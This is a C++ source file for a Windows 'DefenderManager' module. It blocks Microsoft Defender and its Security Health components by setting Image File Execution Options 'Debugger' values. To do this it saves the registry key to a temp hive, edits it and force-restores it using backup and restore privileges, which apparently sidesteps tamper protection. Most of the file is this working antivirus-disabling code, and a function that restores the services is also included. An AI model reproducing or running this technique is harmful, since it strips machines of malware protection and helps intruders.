#include "DefenderManager.h"
#include "Console.h"
#include "StrUtils.h"
#include "RuntimeSupport.h"

#include <windows.h>
#include <tlhelp32.h>

// ============================================================================
// LOCAL HELPERS
// ============================================================================

static bool EnablePrivilege(LPCWSTR privilege) noexcept
{
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = LookupPrivilegeValueW(nullptr, privilege, &tp.Privileges[0].Luid) &&
              AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr) &&
              GetLastError() != ERROR_NOT_ALL_ASSIGNED;
    CloseHandle(hToken);
    return ok;
}

static bool GetTempDir(wchar_t* out, size_t cap) noexcept
{
    DWORD len = GetTempPathW(static_cast<DWORD>(cap), out);
    if (!len || len >= cap) {
        StrUtils::StrCopy(out, cap, L"C:\\Windows\\Temp");
        return true;
    }
    if (len > 0 && out[len - 1] == L'\\') {
        out[len - 1] = L'\0';
    }
    return true;
}

// ============================================================================
// PUBLIC INTERFACE
// ============================================================================

bool DefenderManager::DisableSecurityEngine() noexcept
{
    Console::DbgPrintLine(L"[*] Adding IFEO block for MsMpEng.exe...");

    if (!EnableRequiredPrivileges()) {
        Console::PrintLine(L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME");
        return false;
    }

    HiveContext ctx;
    if (!CreateIFEOSnapshot(ctx)) {
        Console::PrintLine(L"[!] Failed to create IFEO hive snapshot");
        return false;
    }
    if (!ModifyMsMpEngIFEO(ctx, true)) {
        Console::PrintLine(L"[!] Failed to set Debugger value in temp hive");
        return false;
    }
    if (!RestoreIFEOSnapshot(ctx)) {
        Console::PrintLine(L"[!] Failed to restore IFEO hive");
        return false;
    }

    Console::DbgPrintLine(L"[+] IFEO block set");
    return true;
}

bool DefenderManager::EnableSecurityEngine() noexcept
{
    Console::DbgPrintLine(L"[*] Removing IFEO block for MsMpEng.exe...");

    if (!EnableRequiredPrivileges()) {
        Console::PrintLine(L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME");
        return false;
    }

    HiveContext ctx;
    if (!CreateIFEOSnapshot(ctx)) {
        Console::PrintLine(L"[!] Failed to create IFEO hive snapshot");
        return false;
    }
    if (!ModifyMsMpEngIFEO(ctx, false)) {
        Console::PrintLine(L"[!] Failed to remove Debugger value from temp hive");
        return false;
    }
    if (!RestoreIFEOSnapshot(ctx)) {
        Console::PrintLine(L"[!] Failed to restore IFEO hive");
        return false;
    }

    Console::DbgPrintLine(L"[+] IFEO block removed");

    Console::DbgPrintLine(L"[*] Starting WinDefend service...");
    if (StartWinDefend()) {
        Console::DbgPrintLine(L"[+] WinDefend started");
    } else {
        Console::DbgPrintLine(L"[-] WinDefend could not be started");
    }

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService", SERVICE_START);
        if (hHealth) {
            if (StartServiceW(hHealth, 0, nullptr) ||
                GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                Console::DbgPrintLine(L"[+] SecurityHealthService started");
            else
                Console::DbgPrintLine(L"[-] SecurityHealthService could not be started");
            CloseServiceHandle(hHealth);
        }
        CloseServiceHandle(hSCM);
    }

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(L"C:\\Windows\\System32\\SecurityHealthSystray.exe",
                       nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        Console::DbgPrintLine(L"[+] SecurityHealthSystray.exe launched");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return true;
}

// ============================================================================
// STATUS
// ============================================================================

DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
{
    DefenderStatus s{};
    s.state            = SecurityState::UNKNOWN;
    s.ifeoBlocked      = false;
    s.winDefendRunning = false;
    s.msmpengRunning   = false;
    s.ifeoDebugger[0]  = L'\0';

    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MSMPENG_SUBKEY,
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buf[MAX_PATH] = {};
        DWORD sz   = sizeof(buf);
        DWORD type = 0;
        if (RegQueryValueExW(hKey, DEBUGGER_VALUE, nullptr, &type,
                             reinterpret_cast<LPBYTE>(buf), &sz) == ERROR_SUCCESS
            && type == REG_SZ) {
            s.ifeoBlocked = true;
            StrUtils::StrCopy(s.ifeoDebugger, MAX_PATH, buf);
        }
        RegCloseKey(hKey);
    }

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS ss{};
            if (QueryServiceStatus(hSvc, &ss)) {
                s.winDefendRunning = (ss.dwCurrentState == SERVICE_RUNNING);
                if (ss.dwCurrentState == SERVICE_RUNNING && !s.ifeoBlocked)
                    s.state = SecurityState::ACTIVE;
                else if (s.ifeoBlocked)
                    s.state = SecurityState::IFEO_BLOCKED;
                else
                    s.state = SecurityState::INACTIVE;
            }
            CloseServiceHandle(hSvc);
        } else {
            s.state = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
                      ? SecurityState::NOT_INSTALLED
                      : SecurityState::UNKNOWN;
        }
        CloseServiceHandle(hSCM);
    }

    s.msmpengRunning = IsMsMpEngRunning();
    if (s.ifeoBlocked) s.state = SecurityState::IFEO_BLOCKED;

    return s;
}

DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept
{
    return QueryStatus().state;
}

// ============================================================================
// PRIVATE — HIVE OPERATIONS
// ============================================================================

bool DefenderManager::EnableRequiredPrivileges() noexcept
{
    return EnablePrivilege(SE_BACKUP_NAME) &&
           EnablePrivilege(SE_RESTORE_NAME);
}

bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
{
    if (!GetTempDir(ctx.tempPath, MAX_PATH)) return false;

    StrUtils::StrCopy(ctx.hiveFile, MAX_PATH, ctx.tempPath);
    StrUtils::StrConcat(ctx.hiveFile, MAX_PATH, L"\\Ifeo.hiv");

    DeleteFileW(ctx.hiveFile);

    HKEY hCheck = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
                      0, KEY_READ, &hCheck) == ERROR_SUCCESS) {
        RegCloseKey(hCheck);
        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);
    }

    HKEY hIfeo = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                      0, KEY_READ, &hIfeo) != ERROR_SUCCESS) {
        Console::PrintLine(L"[!] Cannot open IFEO registry key");
        return false;
    }

    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile, nullptr, REG_LATEST_FORMAT);
    RegCloseKey(hIfeo);
    if (r != ERROR_SUCCESS) {
        Console::Print(L"[!] RegSaveKeyEx failed: ");
        Console::PrintInt(r);
        Console::PrintLine();
        return false;
    }

    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME, ctx.hiveFile) != ERROR_SUCCESS) {
        Console::PrintLine(L"[!] RegLoadKey failed");
        return false;
    }

    return true;
}

bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBlock) noexcept
{
    static constexpr const wchar_t* targets[] = {
        L"MsMpEng.exe",
        L"SecurityHealthSystray.exe",
        L"SecurityHealthService.exe"
    };

    for (size_t i = 0; i < 3; ++i) {
        wchar_t keyPath[MAX_PATH];
        StrUtils::StrCopy(keyPath, MAX_PATH, TEMP_HIVE_NAME);
        StrUtils::StrConcat(keyPath, MAX_PATH, L"\\");
        StrUtils::StrConcat(keyPath, MAX_PATH, targets[i]);

        const bool required = (i == 0);

        if (addBlock) {
            HKEY hKey = nullptr;
            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath,
                                     0, nullptr, REG_OPTION_NON_VOLATILE,
                                     KEY_WRITE, nullptr, &hKey, nullptr);
            if (r != ERROR_SUCCESS) {
                if (required) {
                    Console::Print(L"[!] RegCreateKeyEx on TempIFEO\\");
                    Console::Print(targets[i]);
                    Console::Print(L" failed: ");
                    Console::PrintInt(r);
                    Console::PrintLine();
                    return false;
                }
                continue;
            }
            const DWORD sz = static_cast<DWORD>((StrUtils::StrLen(DEBUGGER_TARGET) + 1) * sizeof(wchar_t));
            r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
                               reinterpret_cast<const BYTE*>(DEBUGGER_TARGET), sz);
            RegCloseKey(hKey);
            if (r != ERROR_SUCCESS && required) {
                Console::Print(L"[!] RegSetValueEx Debugger failed: ");
                Console::PrintInt(r);
                Console::PrintLine();
                return false;
            }
        } else {
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath,
                              0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                RegDeleteValueW(hKey, DEBUGGER_VALUE);
                RegCloseKey(hKey);
            }
            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath);
        }
    }

    return true;
}

bool DefenderManager::RestoreIFEOSnapshot(const HiveContext& ctx) noexcept
{
    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME) != ERROR_SUCCESS)
        Console::PrintLine(L"[!] Warning: RegUnLoadKey(TempIFEO) failed");

    HKEY hIfeo = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                      0, KEY_WRITE, &hIfeo) != ERROR_SUCCESS) {
        Console::PrintLine(L"[!] Cannot open IFEO key for restore");
        return false;
    }

    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile, REG_FORCE_RESTORE);
    RegCloseKey(hIfeo);
    if (r != ERROR_SUCCESS) {
        Console::Print(L"[!] RegRestoreKey failed: ");
        Console::PrintInt(r);
        Console::PrintLine();
        return false;
    }

    return true;
}

// ============================================================================
// PRIVATE — SERVICE & PROCESS HELPERS
// ============================================================================

bool DefenderManager::StartWinDefend() noexcept
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC,
                                  SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return false;
    }

    bool ok = StartServiceW(hSvc, 0, nullptr)
           || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ok;
}

bool DefenderManager::IsMsMpEngRunning() noexcept
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe{ sizeof(pe) };
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (StrUtils::StrEqualNoCase(pe.szExeFile, L"MsMpEng.exe")) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

bool DefenderManager::IsWinDefendRunning() noexcept
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
    if (!hSvc) { CloseServiceHandle(hSCM); return false; }

    SERVICE_STATUS ss{};
    bool running = QueryServiceStatus(hSvc, &ss)
                && ss.dwCurrentState == SERVICE_RUNNING;

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return running;
}

// ============================================================================
// HIVE CONTEXT CLEANUP
// ============================================================================

void DefenderManager::HiveContext::Cleanup() noexcept
{
    if (hiveFile[0] == L'\0') return;

    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);

    DeleteFileW(hiveFile);

    wchar_t pathBuf[MAX_PATH];
    static const wchar_t* const exts[] = { L".LOG1", L".LOG2", L".blf" };
    for (int i = 0; i < 3; ++i) {
        StrUtils::StrCopy(pathBuf, MAX_PATH, hiveFile);
        StrUtils::StrConcat(pathBuf, MAX_PATH, exts[i]);
        DeleteFileW(pathBuf);
    }

    StrUtils::StrCopy(pathBuf, MAX_PATH, hiveFile);
    StrUtils::StrConcat(pathBuf, MAX_PATH, L".*");

    WIN32_FIND_DATAW fd{};
    HANDLE hFind = FindFirstFileW(pathBuf, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        wchar_t dir[MAX_PATH];
        StrUtils::StrCopy(dir, MAX_PATH, hiveFile);
        wchar_t* lastSlash = nullptr;
        for (wchar_t* p = dir; *p; ++p) {
            if (*p == L'\\') lastSlash = p;
        }
        if (lastSlash) *(lastSlash + 1) = L'\0';

        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                wchar_t fullPath[MAX_PATH];
                StrUtils::StrCopy(fullPath, MAX_PATH, dir);
                StrUtils::StrConcat(fullPath, MAX_PATH, fd.cFileName);
                DeleteFileW(fullPath);
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    hiveFile[0] = L'\0';
}
